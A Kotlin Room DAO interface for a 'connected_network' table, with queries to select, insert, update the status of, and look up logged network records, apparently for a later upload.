package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.ConnectedNetwork
import com.android.services.util.AppConstants
import java.util.*

@Dao
interface ConnectedNetworkDao {

    @Query("Select * from connected_network where status = :status order by date DESC limit ${AppConstants.otherLogsUploadLimit}")
    fun selectAllConnectedNetworks(status: Int): List<ConnectedNetwork>

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(connectedNetwork: ConnectedNetwork)

    @Query("Update connected_network set status = :updated_status where date BETWEEN :startDate AND :endDate")
    fun updateConnectedNetworks(updated_status: Int, startDate: Date, endDate: Date): Int

    @Query("Select * from connected_network ORDER BY date DESC Limit 1")
    fun getLastConnectedNetwork(): ConnectedNetwork?

    @Query("Select networkName from connected_network where unique_id=:uniqueId")
    fun checkIfNotExistsAlready(uniqueId: String): String?
}